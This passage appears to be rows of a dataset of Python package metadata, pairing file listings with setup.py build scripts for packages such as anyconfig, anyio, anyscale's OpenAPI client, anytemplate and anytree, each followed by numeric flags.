10.json 20.conf 30.json 10.json 20.json 30.json 10.json 20.json 30.json 10.json 20.json 30.json 10.json 20.json 30.json 10.json 20.json 30.json README.md 10.json 20.json 30.json 10.json 20.json 30.json 10.json 20.json 30.json 10.json 20.json 30.json 10.json 20.json 10.json 20.json 10.json 20.json 10.json 20.json 10.json 20.json 10.json 20.json README.md 10.json 10.json 10.json 10.json 10.json README.md 10.json 10.json 10.json 10.json 10.json README.md 10.json 20.json 30.yml 40.yml 10.json 20.json 30.json 40.json 10.json 20.json 30.json 40.json 10.json 20.json 30.json 40.json 10.json 20.json 30.json 40.json 10.json 20.json 30.json 40.json README.md 10.json 20.json 10.json 20.json 10.json 20.json 10.json 20.json 10.json 20.json 00_primitives.json 10.json 10_primitives.json 10.json 20.json 10.json 20.json 10.py 20.py 10.py 20.py 00.json 10.json 100.json 110.json 20.json 30.json 40.json 50.json 60.json 70.json 80.json 90.json 00.json 10.json 100.py 110.py 20.py 30.py 40.py 50.py 60.py 70.py 80.py 90.py 00.py 10.py 100.py 110.py 20.py 30.py 40.py 50.py 60.py 70.py 80.py 90.py 00.py 10.py 100.py 110.py 20.py 30.py 40.py 50.py 60.py 70.py 80.py 90.py 10.json 20.json 30.json 10.py 20.json 30.json 10.txt 20.txt 30.txt 10.txt 20.txt 30.txt 10.json 10.json 10.json 10.json 10.json 10.json 10.json 10.json 10.json 10.json 10.json 10.json 10.json 10.json 10.json 10.json 10.py 20.py 10.json 20.json 10.json 20.json 10.py 20.py 00.json 10.json 20.json 00.txt 10.txt 20.txt 00.json 10.json 20.json 00.json 10.json 20.json 00.txt 10.txt 20.txt 00.json 10.json 20.json 00.json 10.json 20.json 00.txt 10.txt 20.txt 00.json 10.json 20.json 00.json 10.json 20.json 00.txt 10.txt 20.txt 00.json 10.json 20.json 00.ini 00.json 00.json 10.json 20.json 00.json 10.json 20.json 10.json 20.json 30.json 40.json 10.txt 20.txt 30.txt 40.txt 00_00.json 00_10.json 10_00.json 10_10.json 10_20.json 10_30.json 10_40.json 20_00.json 20_10.json 20_20.json 00_00.json 00_10.json 10_00.json 10_10.json 10_20.json 10_30.json 10_40.json 10_50.json 20_00.json 20_10.json 20_20.json 00_00.txt 00_10.txt 10_00.txt 10_10.txt 10_20.txt 10_30.txt 10_40.txt 10_50.txt 20_00.txt 20_10.txt 20_20.txt 00.json 10.json 20.json 00.json 10.json 20.json 00.json 10.json 20.json 00.json 10.json 20.json 30.json 40.json exp.json 00.json 00.json 00.json 10.json 20.json 30.json 40.json 50.json exp.json 00.json 00.json 10.json 20.json 30.json 40.json 50.json exp.json 00.json 00.json 10.json 20.json 30.json 40.json 50.json exp.json 00.json 00.json 10.ini 20.json 30.json 40.properties 50.sh exp.json 00.json 00.json 10.json 20.json 30.json 40.json exp.json 00.json q.txt 00.json 10.json 20.json 30.json 40.json exp.json 00.json q.txt 00.json 10.json 20.json 30.json 40.json exp.json 00.json q.txt 00.json 10.json 20.json 30.json 40.json exp.json 00.json q.txt 00.json 10.json 20.json 30.json 40.json exp.json 00.json q.txt 00.json 10.json 20.json 30.json 40.json exp.json 00.json q.txt 00.json 10.json 20.json 30.json 40.json exp.json 00.json q.txt 00.json 10.json 20.json 30.json 40.json exp.json 00.json q.txt 00.json 10.json 20.json 30.json 40.json exp.json 00.json q.txt 00.json 10.json 20.json 30.json 40.json exp.json 00.json q.txt 00.json 10.json 20.json 30.json 40.json exp.json 00.json 00.json 00.json 30.json 00.json exp.json 00.json 00.json 10.json 20.json 30.json 00.json exp.json 00.json 00.json 10.json 20.json 30.json exp.json 00.json 00.conf 10.conf 20.conf 00.py 10.py 20.py 00.json 10.json 20.json 00.json 10.json 20.json 00.py 10.py 20.py 00.json 10.json 20.json 00.json 10.json 20.json test_cases_with_schema_validation.txt 00.json 10.json 20.json 00.json 10.json 20.json 00.json 10.json 20.json test_cases_with_explicit_parser_type_option.txt 10.ini 20.properties 10.json 20.json 10.sh 10.json 10.json 00.xml 10.xml 20.xml 00.json 10.json 20.json 10.json 20.json 30.json 40.json 10.py 20.py 30.py 40.py 00_00.json 00_10.json 10_00.json 10_10.json 10_20.json 10_30.json 20_00.json 20_10.json 20_20.json 00_00.json 00_10.json 10_00.json 10_10.json 10_20.json 10_30.json 10_40.json 10_50.json 20_00.json 20_10.json 20_20.json 00_00.txt 00_10.txt 10_00.txt 10_10.txt 10_20.txt 10_30.txt 10_40.txt 10_50.txt 20_00.txt 20_10.txt 20_20.txt 00.json 10.json 20.json 00.py 10.py 20.py 00.json 10.json 20.json 00.j2 10.j2 20.j2 00.json 10.json 20.json 00.json 10.json 20.json 00.json 10.json 20.json 00.j2 10.j2 20.j2 30.j2 00.json 10.json 20.json 30.json 00.json 10.json 20.json 30.json 00.json 10.json 20.json 30.json 00.j2 10.j2 20.j2 00.json 10.json 20.json 00.py 10.py 20.py 00.json 10.json 20.json 00.toml 10.toml 20.toml 00.json 10.json 20.json 00.yml 10.yml 20.yml 00.json 10.json 20.json 00.txt 10.txt 20.txt 00.json 10.json 20.json 00.json 10.json 20.json 00_00.txt 00_10.txt 10_00.txt 10_10.txt 10_20.txt 10_30.txt 10_40.txt 20_00.txt 20_10.txt 20_20.txt 00_00.json 00_10.json 10_00.json 10_10.json 10_20.json 10_30.json 10_40.json 10_50.json 20_00.json 20_10.json 20_20.json 00_00.json 00_10.json 10_00.json 10_10.json 10_20.json 10_30.json 10_40.json 20_00.json 20_10.json 20_20.json 00_00.txt 00_10.txt 10_00.txt 10_10.txt 10_20.txt 10_30.txt 10_40.txt 10_50.txt 20_00.txt 20_10.txt 20_20.txt 00.txt 10.txt 20.txt 00.json 10.json 20.json 00.json 10.json 20.json 00.txt 10.txt 20.txt 00.txt 10.txt 20.txt 00.json 10.json 20.json 00.json 10.json 20.json 00.json 10.json 20.json 00.json 10.json 20.json 30.json 40.json exp.json 00.json 00.json 00.json 10.json 20.json 30.json 40.json 50.json exp.json 00.json 00.json 10.json 20.json 30.json 40.json 50.json exp.json 00.json 00.json 10.json 20.json 30.json 40.json 50.json exp.json 00.json 00.json 10.ini 20.json 30.json 40.properties 50.sh exp.json 00.json 00.json 10.json 20.json 30.json 40.json exp.json 00.json q.txt 00.json 10.json 20.json 30.json 40.json exp.json 00.json q.txt 00.json 10.json 20.json 30.json 40.json exp.json 00.json q.txt 00.json 10.json 20.json 30.json 40.json exp.json 00.json q.txt 00.json 10.json 20.json 30.json 40.json exp.json 00.json q.txt 00.json 10.json 20.json 30.json 40.json exp.json 00.json q.txt 00.json 10.json 20.json 30.json 40.json exp.json 00.json q.txt 00.json 10.json 20.json 30.json 40.json exp.json 00.json q.txt 00.json 10.json 20.json 30.json 40.json exp.json 00.json q.txt 00.json 10.json 20.json 30.json 40.json exp.json 00.json q.txt 00.json 10.json 20.json 30.json 40.json exp.json 00.json 00.json 00.json 30.json 00.json exp.json 00.json 00.json 10.json 20.json 30.json 00.json exp.json 00.json 00.json 10.json 20.json 30.json exp.json 00.json 00.json 10.json 20.json 00.json 10.json 20.json 00.json 10.json 20.json 00.json 10.json 20.json 00.json 10.json 20.json 00.txt 10.txt 20.txt 30.txt 40.txt 00.json 10.json 20.json 30.json 40.json 00.txt 10.txt 20.txt 30.txt 40.txt 00.json 10.py 20.py 30.py 40.py 00.txt 10.txt 20.txt 30.txt 40.txt 50.txt 00.json 10.json 20.json 30.json 40.json 50.json 00.json 10.json 20.json 30.json 40.json 50.json 00.py 10.txt 20.txt 30.txt 40.py 50.py 60.txt 70.txt 00.py 10.py 20.py 30.py 40.py 50.py 60.py 70.py 20.txt 30.txt 40.txt 00.json 10.json 20.json 30.json 40.json 50.json 10.txt 20.txt 30.txt 40.txt 00.json 10.json 20.json 30.json 40.json 00.py 10.txt 20.txt 30.txt 40.py 50.py 60.txt 70.txt 00.py 10.py 20.py 30.py 40.py 50.py 60.py 70.py 10.properties 10.json 10.sh 10.json 00.conf 10.conf 20.conf 00.py 10.py 20.py 00.json 10.json 20.json 00.json 10.json 20.json 00.py 10.py 20.py 00.json 10.json 20.json 00.json 10.json 20.json test_cases_with_schema_validation.txt 00.json 10.json 20.json 00.json 10.json 20.json 00.json 10.json 20.json test_cases_with_explicit_parser_type_option.txt 10.ini 20.properties 10.json 20.json 10.sh 10.json 10.json 00.xml 10.xml 20.xml 00.json 10.json 20.json 10.json 20.json 30.json 40.json 10.py 20.py 30.py 40.py 00_00.json 00_10.json 10_00.json 10_10.json 10_20.json 10_30.json 20_00.json 20_10.json 20_20.json 00_00.json 00_10.json 10_00.json 10_10.json 10_20.json 10_30.json 10_40.json 10_50.json 20_00.json 20_10.json 20_20.json 00_00.txt 00_10.txt 10_00.txt 10_10.txt 10_20.txt 10_30.txt 10_40.txt 10_50.txt 20_00.txt 20_10.txt 20_20.txt 00.json 10.json 20.json 00.py 10.py 20.py 00.json 10.json 20.json 00.j2 10.j2 20.j2 00.json 10.json 20.json 00.json 10.json 20.json 00.json 10.json 20.json 00.j2 10.j2 20.j2 30.j2 00.json 10.json 20.json 30.json 00.json 10.json 20.json 30.json 00.json 10.json 20.json 30.json 00.j2 10.j2 20.j2 00.json 10.json 20.json 00.py 10.py 20.py 00.json 10.json 20.json 00.toml 10.toml 20.toml 00.json 10.json 20.json 00.yml 10.yml 20.yml 00.json 10.json 20.json 10.j2 20.j2 10.txt 10.j2 10.txt 00.xml 10.xml 20.xml 00.json 10.json 20.json test_jsonschema.py __init__.py test_jinja2.py __init__.py test_lib.py test_singleton.py test_detectors.py test_files.py test_lists.py test_utils.py __init__.py __init__.py tox.ini,"""""""setup.py to build package.""""""
import os
import pathlib
import re
import setuptools
import setuptools.command.bdist_rpm


# It might throw IndexError and so on.
VERSION = '0.1.0'
VER_REG = re.compile(r""^__version__ = '([^']+)'"")

for fpath in pathlib.Path('src').glob('**/__init__.py'):
    for line in fpath.open():
        match = VER_REG.match(line)
        if match:
            VERSION = match.groups()[0]
            break

# For daily snapshot versioning mode:
RELEASE = ""1%{?dist}""
if os.environ.get(""_SNAPSHOT_BUILD"", None) is not None:
    import datetime
    RELEASE = RELEASE.replace('1',
                              datetime.datetime.now().strftime(""%Y%m%d""))


def _replace(line):
    """"""Replace some strings in the RPM SPEC template.""""""
    if ""@VERSION@"" in line:
        return line.replace(""@VERSION@"", VERSION)

    if ""@RELEASE@"" in line:
        return line.replace(""@RELEASE@"", RELEASE)

    if ""Source0:"" in line:  # Dirty hack
        return ""Source0: %{pkgname}-%{version}.tar.gz""

    return line


class bdist_rpm(setuptools.command.bdist_rpm.bdist_rpm):
    """"""Override the default content of the RPM SPEC.""""""

    spec_tmpl = pathlib.Path('pkg/package.spec.in').resolve()

    def _make_spec_file(self):
        """"""Generate the RPM SPEC file.""""""
        return [_replace(line.rstrip()) for line in self.spec_tmpl.open()]


setuptools.setup(version=VERSION, cmdclass=dict(bdist_rpm=bdist_rpm),
                 data_files=[(""share/man/man1"", [""docs/anyconfig_cli.1""])])

# vim:sw=4:ts=4:et:
",0
anyio-3.6.1,1,1,1,0,0,0,0,0,publish.yml test.yml .gitignore .pre-commit-config.yaml .readthedocs.yml api.rst basics.rst cancellation.rst conf.py contributing.rst faq.rst fileio.rst index.rst migration.rst networking.rst signals.rst streams.rst subprocesses.rst support.rst synchronization.rst tasks.rst testing.rst threads.rst typedattrs.rst versionhistory.rst LICENSE PKG-INFO pyproject.toml README.rst setup.cfg setup.py _resources.py _sockets.py _streams.py _subprocesses.py _tasks.py _testing.py __init__.py from_thread.py lowlevel.py py.typed pytest_plugin.py buffered.py file.py memory.py stapled.py text.py tls.py __init__.py to_process.py to_thread.py _asyncio.py _trio.py __init__.py _compat.py _eventloop.py _exceptions.py _fileio.py _resources.py _signals.py _sockets.py _streams.py _subprocesses.py _synchronization.py _tasks.py _testing.py _typedattr.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt conftest.py test_buffered.py test_file.py test_memory.py test_stapled.py test_text.py test_tls.py __init__.py test_compat.py test_debugging.py test_eventloop.py test_fileio.py test_from_thread.py test_lowlevel.py test_pytest_plugin.py test_signals.py test_sockets.py test_subprocesses.py test_synchronization.py test_taskgroups.py test_to_process.py test_to_thread.py __init__.py tox.ini,"from setuptools import setup

setup(use_scm_version=True, setup_requires=[""setuptools_scm""])
",1
an-0.3.3,0,1,1,1,0,0,1,0,,,1
anyscale-0.5.42,0,1,1,0,0,0,0,0,.covrc anyscale_schema.json api.py authenticate.py auth_proxy.py node_provider.py __init__.py command_runner.py example.yaml node_provider.py __init__.py node_provider.py __init__.py node_provided_cache.py node_provider.py __init__.py aws_iam_policies.py job_runner.py __init__.py cached_gcp_regions.json .gitignore .gitlab-ci.yml VERSION .openapi-generator-ignore .travis.yml git_push.sh default_api.py __init__.py api_client.py configuration.py exceptions.py actorlogs_response.py actor_lifetime.py actor_logs.py actor_status.py add_instance_pool_member.py anyscaleawsaccount_response.py anyscaledconfig_response.py anyscaledcredentialresponse_response.py anyscaleddataplaneconfig_response.py anyscaled_config.py anyscaled_credential_response.py anyscaled_dataplane_config.py anyscaleversionresponse_response.py anyscale_aws_account.py anyscale_version_response.py appconfig_response.py applied_snapshot.py app_config.py app_config_config_schema.py archivedlogsinfo_response.py archived_logs_info.py archive_status.py autoscalercredentials_response.py autoscaler_credentials.py autoscaler_report.py autoscaler_status.py autosyncsessionid_list_response.py autosyncsessionid_response.py autosync_session_id.py awsregionandzones_response.py aws_node_options.py aws_region_and_zones.py aws_region_info.py aws_tag.py aws_tag_specification.py bank_account_information.py baseimagesenum.py base_job_status.py batched_result_organization_invitation_base.py batch_response_batched_result_organization_invitation_base.py billing_information.py block_device_mapping.py build.py buildlogresponse_response.py build_log_response.py build_response.py build_status.py card.py card_id.py card_list_response.py change_password_params.py clone_experimental_workspace.py cloud.py cloudregionandzones_response.py cloud_config.py cloud_list_response.py cloud_name_options.py cloud_provider.py cloud_providers.py cloud_region_and_zones.py cloud_region_info.py cloud_response.py cloud_status.py cloud_types.py clusterconfigwithsessionidletimeout_response.py clusterconfig_response.py clusterfeatures_response.py clustermonitorresponse_response.py clusterstatus_response.py cluster_compute_config.py cluster_config.py cluster_config_with_session_idle_timeout.py cluster_features.py cluster_monitor_response.py cluster_status.py computetemplateconfig_response.py computetemplate_response.py compute_node_type.py compute_template.py compute_template_config.py compute_template_query.py create_app_config.py create_app_config_configuration_schema.py create_build.py create_compute_template.py create_cron_job.py create_experimental_workspace.py create_experimental_workspace_from_job.py create_from_github_options.py create_nodes_options.py create_organization_invitation.py create_production_job.py create_production_job_config.py create_production_service.py create_response.py create_session_from_snapshot_options.py create_session_in_db.py create_structured_output.py create_user.py create_user_project_collaborator.py create_user_project_collaborator_value.py credit_card_information.py decoratedactor_list_response.py decoratedactor_response.py decoratedapplicationtemplate_list_response.py decoratedapplicationtemplate_response.py decoratedbuild_list_response.py decoratedbuild_response.py decoratedcomputetemplate_list_response.py decoratedcomputetemplate_response.py decoratedcronjob_list_response.py decoratedcronjob_response.py decoratedinteractivesession_list_response.py decoratedinteractivesession_response.py decoratedjobsubmission_list_response.py decoratedjobsubmission_response.py decoratedjob_list_response.py decoratedjob_response.py decoratedproductionjobstatetransition_list_response.py decoratedproductionjob_list_response.py decoratedproductionjob_response.py decoratedruntimeenv_list_response.py decoratedruntimeenv_response.py decoratedservedeployment_list_response.py decoratedservedeployment_response.py decoratedsession_list_response.py decoratedsession_response.py decoratedsupportrequest_list_response.py decoratedsupportrequest_response.py decorated_actor.py decorated_application_template.py decorated_build.py decorated_compute_template.py decorated_compute_template_config.py decorated_cron_job.py decorated_interactive_session.py decorated_job.py decorated_job_submission.py decorated_production_job.py decorated_production_job_state_transition.py decorated_runtime_env.py decorated_serve_deployment.py decorated_session.py decorated_support_request.py deployment_status.py dismissal_type.py ebs_block_device.py error.py executecommandresponse_response.py execute_command_response.py execute_interactive_command_options.py execute_shell_command_options.py experimentalworkspace_list_response.py experimentalworkspace_response.py experimental_workspace.py externalservicestatusresponse_response.py external_service_status.py external_service_status_response.py external_terminal_command.py featureflagresponse_response.py feature_compatibility.py feature_flag_response.py gcp_node_disk.py gcp_node_options.py githubproject_response.py github_project.py ha_jobs_sort_field.py ha_job_goal_states.py ha_job_states.py ha_job_type.py headip_response.py head_ip.py historicalcosts_list_response.py historical_costs.py historical_cost_granularity.py http_validation_error.py iam_instance_profile_specification.py idle_termination_status.py instance.py instanceexternalip_response.py instanceid_response.py instanceinternalip_response.py instanceisrunning_response.py instanceisterminated_response.py instancepoolmember_response.py instance_external_ip.py instance_id.py instance_internal_ip.py instance_is_running.py instance_is_terminated.py instance_list_response.py instance_pool_member.py instance_response.py instance_status.py interactivesessionlogs_response.py interactive_session_logs.py internalproductionjob_response.py internal_production_job.py invoice.py invoices_query.py invoice_list_response.py invoice_status.py jobslogsqueryinfo_response.py jobslogs_response.py jobs_logs.py jobs_logs_query_info.py jobs_sort_field.py job_access.py job_run_type.py job_state_log_level_types.py job_status.py job_submissions_sort_field.py json_patch_operation.py list_response_metadata.py logdetails_response.py login_user_params.py logsoutput_response.py logs_output.py log_detail.py log_details.py log_download_config.py log_download_request.py log_filter.py log_level_types.py metric_period.py minibuild_list_response.py minicomputetemplate_list_response.py miniproject_list_response.py mini_build.py mini_cloud.py mini_cluster.py mini_compute_template.py mini_job_run.py mini_namespace.py mini_organization.py mini_production_job.py mini_project.py mini_runtime_environment.py mini_user.py network_interface.py nodes_options.py node_registration.py node_registration_aws.py node_registration_gcp.py node_type.py non_terminated_nodes_options.py onboarding_user_cards_query.py organization.py organizationavailability_response.py organizationcollaborator_list_response.py organizationinvitationbase_response.py organizationinvitation_list_response.py organizationinvitation_response.py organizationprojectcollaborator_list_response.py organization_availability.py organization_collaborator.py organization_invitation.py organization_invitation_base.py organization_permission_level.py organization_project_collaborator.py organization_project_collaborator_value.py organization_response.py page_query.py permission_level.py poolconfiginfo_response.py poolinstance_list_response.py pool_config_info.py pool_instance.py productionjob_response.py production_job.py production_job_config.py production_job_state_transition.py product_type.py project.py projectbase_response.py projectcollaborator_list_response.py projectdefaultsessionname_response.py projects_sort_field.py project_base.py project_collaborator.py project_collaborators_put_message.py project_collaborator_value.py project_create_message.py project_default_session_name.py project_delete_message.py project_list_response.py project_patch_message.py project_response.py providermetadata_response.py provider_metadata.py python_modules.py query_pool_size.py ray_runtime_env_config.py request_instance_pool_member.py request_organization_identifiers_params.py request_password_reset_params.py reset_password_params.py resources.py resource_historical_costs.py s3_download_location.py servedeploymentlogs_response.py servereplica_list_response.py serversessiontoken_response.py server_session_token.py serve_deployment_grafana_dashboard_status.py serve_deployment_logs.py serve_replica.py serve_replica_metric.py service_account.py service_usage.py session.py sessioncommandid_response.py sessioncommand_list_response.py sessiondescribe_response.py sessiondetails_response.py sessionevent_list_response.py sessionhistoryitem_list_response.py sessionid_response.py sessionsshkey_response.py sessions_sort_field.py session_access.py session_autosync_sessions_update_message.py session_command.py session_command_finish_options.py session_command_id.py session_command_types.py session_create_message.py session_delete_message.py session_describe.py session_details.py session_event.py session_event_cause.py session_event_types.py session_execute_message.py session_finish_command_message.py session_history_item.py session_id.py session_kill_command_message.py session_list_response.py session_patch_message.py session_response.py session_ssh_key.py session_starting_up_data.py session_state.py session_state_change_message.py session_state_data.py session_stopping_data.py session_up_options.py setup_initialize_session_options.py set_node_tags_options.py snapshot_create_message.py snapshot_delete_message.py snapshot_patch_message.py socketmessageschemas_response.py socketmessagetypes_response.py socket_message_schemas.py socket_message_types.py sort_order.py ssologininfo_response.py sso_login_info.py startemptysessionresponse_response.py start_empty_session_response.py start_session_options.py stop_session_options.py structuredoutput_response.py structured_output.py supportedbaseimagesenum.py support_requests_query.py text_query.py timestampedlogsoutput_response.py timestamped_logs_output.py update_compute_template.py update_organization_collaborator.py update_project_collaborator.py uploadsessioncommandlogslocations_response.py upload_session_command_logs_locations.py userinfo_response.py user_info.py user_resend_email_options.py user_service_access_types.py validation_error.py visibility.py wait_until_stopped_options.py wandburlresponse_response.py wand_burl_response.py wand_b_data.py webterminal_list_response.py webterminal_response.py web_terminal.py worker_node_type.py write_cloud.py write_cluster_config.py write_project.py write_session.py write_support_request.py __init__.py rest.py __init__.py README.md requirements.txt setup.cfg setup.py test-requirements.txt tox.ini cli_logger.py cloud.py cluster.py cluster_compute.py cluster_config.py cluster_env.py api_commands.py projects_commands.py sessions_commands.py session_commands_commands.py session_operations_commands.py __init__.py auth_commands.py cloud_commands.py cluster_commands.py cluster_compute_commands.py cluster_env_commands.py config_commands.py download_logs_commands.py exec_commands.py experimental_integrations_commands.py job_commands.py list_commands.py migrate_commands.py project_commands.py service_commands.py session_commands.py session_commands_hidden.py util.py workspace_commands.py __init__.py conf.py connect.py prepare_cluster.py project.py start_interactive_session.py __init__.py auth_controller.py base_controller.py cloud_controller.py cluster_compute_controller.py cluster_controller.py cluster_env_controller.py config_controller.py exec_controller.py experimental_integrations_controller.py jobs_bg_controller.py job_controller.py list_controller.py project_controller.py service_controller.py session_controller.py workspace_controller.py __init__.py experimental_integrations.py feature_flags.py fingerprint.py clouds_formatter.py common_formatter.py __init__.py job.py links.py project.py ProjectConfig.json scripts.py default_api.py __init__.py api_client.py configuration.py exceptions.py actor.py actorlogs_response.py actors_query.py actor_lifetime.py actor_list_response.py actor_logs.py actor_response.py actor_status.py appconfig_list_response.py appconfig_response.py app_config.py app_config_config_schema.py archive_status.py aws_node_options.py aws_tag.py aws_tag_specification.py baseimagesenum.py base_job_status.py block_device_mapping.py build.py buildlogresponse_response.py build_list_response.py build_log_response.py build_response.py build_status.py cloud.py clouds_query.py cloud_config.py cloud_list_response.py cloud_providers.py cloud_response.py cloud_status.py cloud_types.py cluster.py clustercompute_list_response.py clustercompute_response.py clusterenvironmentbuildlogresponse_response.py clusterenvironmentbuildoperation_response.py clusterenvironmentbuild_list_response.py clusterenvironmentbuild_response.py clusterenvironment_list_response.py clusterenvironment_response.py clusteroperation_response.py clusters_query.py cluster_compute.py cluster_computes_query.py cluster_compute_config.py cluster_environment.py cluster_environments_query.py cluster_environment_build.py cluster_environment_build_log_response.py cluster_environment_build_operation.py cluster_environment_build_status.py cluster_head_node_info.py cluster_list_response.py cluster_operation.py cluster_operation_type.py cluster_response.py cluster_services_urls.py cluster_state.py computetemplateconfig_response.py computetemplate_list_response.py computetemplate_response.py compute_node_type.py compute_template.py compute_template_config.py compute_template_query.py create_app_config.py create_app_config_configuration_schema.py create_build.py create_cloud.py create_cluster.py create_cluster_compute.py create_cluster_compute_config.py create_cluster_environment.py create_cluster_environment_build.py create_cluster_environment_configuration_schema.py create_compute_template.py create_production_job.py create_production_job_config.py create_production_service.py create_project.py create_response.py create_session.py create_session_command.py create_sso_config.py ebs_block_device.py gcp_node_disk.py gcp_node_options.py ha_job_goal_states.py ha_job_states.py http_validation_error.py iam_instance_profile_specification.py idle_termination_status.py job.py jobslogs_response.py jobs_logs.py jobs_query.py jobs_sort_field.py job_list_response.py job_response.py job_run_type.py job_status.py list_response_metadata.py log_level_types.py namespace.py namespace_response.py network_interface.py objectstorageconfig_response.py object_storage_config.py object_storage_config_s3.py operation_error.py operation_progress.py operation_result.py organization.py organization_response.py page_query.py productionjob_list_response.py productionjob_response.py productionservice_list_response.py productionservice_response.py production_job.py production_job_config.py production_job_state_transition.py production_service.py project.py projects_query.py project_list_response.py project_response.py python_modules.py python_version.py ray_runtime_env_config.py resources.py runtimeenvironment_response.py runtime_environment.py service_account.py session.py sessioncommand_list_response.py sessioncommand_response.py sessionevent_list_response.py sessionoperation_response.py sessions_query.py session_command.py session_command_types.py session_event.py session_event_cause.py session_event_types.py session_list_response.py session_operation.py session_operation_type.py session_response.py session_starting_up_data.py session_state.py session_state_data.py session_stopping_data.py sort_by_clause_jobs_sort_field.py sort_order.py ssoconfig_response.py sso_config.py sso_mode.py start_cluster_options.py start_session_options.py static_sso_config.py supportedbaseimagesenum.py terminate_cluster_options.py terminate_session_options.py text_query.py update_app_config.py update_cloud.py update_cluster.py update_compute_template.py update_organization.py update_project.py update_session.py user_service_access_types.py validation_error.py worker_node_type.py __init__.py rest.py sdk.py __init__.py conf.py default_anyscale_aws.yaml default_anyscale_gcp.yaml headers.py project.py util.py byod.py id_gen.py protected_string.py ray_semver.py __init__.py __init__.py snapshot.py snapshot_util.py util.py aws_credentials_util.py cloud_utils.py connect_helpers.py env_utils.py ray_conda.py ray_utils.py ray_version_checker.py runtime_env.py __init__.py version.py command_persister.py utils.py webterminal.py __init__.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt BUILD.bazel PKG-INFO README.md requirements.in setup.cfg setup.py BUILD.bazel test_node_provider.py BUILD.bazel clientLibraryConfig-aws-pool.json conftest.py BUILD.bazel test_prepare_cluster.py test_project_block.py test_start_interactive_session.py BUILD.bazel test_auth_controller.py test_base_controller.py test_cloud_controller.py test_cluster_compute_controller.py test_cluster_controller.py test_cluster_env_controller.py test_config_controller.py test_exec_controller.py test_job_controller.py test_job_controller_working_dir.py test_list_controller.py test_project_controller.py test_service_controller.py test_session_controller.py __init__.py test_authenticate.py test_auth_proxy.py test_cli_logger.py test_cli_utils.py test_cloud.py test_cluster.py test_cluster_compute.py test_cluster_config.py test_cluster_env.py test_connect.py test_init.py test_job_output.py test_project.py test_ray_version_checker.py test_runtime_env.py test_util.py __init__.py,"# coding: utf-8

""""""
    Managed Ray API

    No description provided (generated by Openapi Generator https://github.com/openapitools/openapi-generator)  # noqa: E501

    The version of the OpenAPI document: 0.1.0
    Generated by: https://openapi-generator.tech
""""""


from setuptools import setup, find_packages  # noqa: H301

NAME = ""openapi-client""
VERSION = ""1.0.0""
# To install the library, run the following
#
# python setup.py install
#
# prerequisite: setuptools
# http://pypi.python.org/pypi/setuptools

REQUIRES = [""urllib3 >= 1.15"", ""six >= 1.10"", ""certifi"", ""python-dateutil""]

setup(
    name=NAME,
    version=VERSION,
    description=""Managed Ray API"",
    author=""OpenAPI Generator community"",
    author_email=""team@openapitools.org"",
    url="""",
    keywords=[""OpenAPI"", ""OpenAPI-Generator"", ""Managed Ray API""],
    install_requires=REQUIRES,
    packages=find_packages(exclude=[""test"", ""tests""]),
    include_package_data=True,
    long_description=""""""\
    No description provided (generated by Openapi Generator https://github.com/openapitools/openapi-generator)  # noqa: E501
    """"""
)
",1
anytemplate-0.1.6,0,1,1,1,1,0,0,0,.gitignore .travis.yml ChangeLog ctx.yml jinja2-incl.j2 jinja2.j2 LICENSE.MIT MANIFEST.in copr-build.sh nose.cfg package.spec.in PKG-INFO README.rst requirements.txt setup.cfg setup.py api.py cli.py compat.py engine.py base.py cheetah.py jinja2.py mako.py pystache.py strtemplate.py tenjin.py __init__.py globals.py utils.py __init__.py dependency_links.txt entry_points.txt PKG-INFO requires.txt SOURCES.txt top_level.txt api.py cli.py common.py compat.py engine.py base.py cheetah.py jinja2.py mako.py pystache.py strtemplate.py tenjin.py __init__.py globals.py import_errors.py releng.bats requirements.txt utils.py __init__.py tox.ini,"""""""setup.py to build package.
""""""
from __future__ import absolute_import

import glob
import os.path
import os
import re
import setuptools
import setuptools.command.bdist_rpm


# It might throw IndexError and so on.
VERSION = [re.search(r'^VERSION = ""([^""]+)""', l).groups()[0] for l
           in open(glob.glob(""src/*/globals.py"")[0])
           if ""VERSION"" in l][0]

# For daily snapshot versioning mode:
RELEASE = ""1%{?dist}""
if os.environ.get(""_SNAPSHOT_BUILD"", None) is not None:
    import datetime
    RELEASE = datetime.datetime.now().strftime("".%Y%m%d%H%M%S"")


def _replace(line):
    """"""Replace some strings in the RPM SPEC template""""""
    if ""@VERSION@"" in line:
        return line.replace(""@VERSION@"", VERSION)

    if ""@RELEASE@"" in line:
        return line.replace(""@RELEASE@"", RELEASE)

    if ""Source0:"" in line:  # Dirty hack
        return ""Source0: %{pkgname}-%{version}.tar.gz""

    return line


class bdist_rpm(setuptools.command.bdist_rpm.bdist_rpm):
    """"""Override the default content of the RPM SPEC.
    """"""
    spec_tmpl = os.path.join(os.path.abspath(os.curdir),
                             ""pkg/package.spec.in"")

    def _make_spec_file(self):
        return [_replace(l.rstrip()) for l in open(self.spec_tmpl)]


setuptools.setup(name=""anytemplate"",   # Avoid 'Unknown' package in older ones.
                 version=VERSION,
                 cmdclass=dict(bdist_rpm=bdist_rpm),
                 package_dir={'': 'src'})

# vim:sw=4:ts=4:et:
",1
anytree-2.8.0,0,1,1,1,1,0,0,0,cachedsearch.py dotexport.py dictexporter.py dotexporter.py jsonexporter.py __init__.py dictimporter.py jsonimporter.py __init__.py abstractiter.py levelordergroupiter.py levelorderiter.py postorderiter.py preorderiter.py zigzaggroupiter.py __init__.py anynode.py exceptions.py node.py nodemixin.py symlinknode.py symlinknodemixin.py util.py __init__.py render.py resolver.py search.py __init__.py walker.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt anytree.cachedsearch.rst anytree.iterators.rst anytree.node.rst anytree.render.rst anytree.resolver.rst anytree.search.rst anytree.util.rst anytree.walker.rst api.rst conf.py dotexport.rst dictexporter.rst dotexporter.rst jsonexporter.rst exporter.rst dictimporter.rst jsonimporter.rst importer.rst index.rst installation.rst intro.rst Makefile buymeacoffee.png dan.png dotexporter0.png dotexporter1.png tree.png udo.png uniquedotexporter2.png weight.png multidim.rst readonly.rst weightededges.rst yaml.rst tricks.rst LICENSE MANIFEST.in PKG-INFO README.rst setup.cfg setup.py helper.py tree1.dot tree2.dot tree3.dot tree4.dot test_cachedsearch.py test_dictexporter.py test_dictimporter.py test_dotexport.py test_dotexporter.py test_examples.py test_iterators.py test_jsonexporter.py test_jsonimporter.py test_node.py test_node_integrity.py test_node_sep.py test_node_symlink.py test_render.py test_resolver.py test_search.py 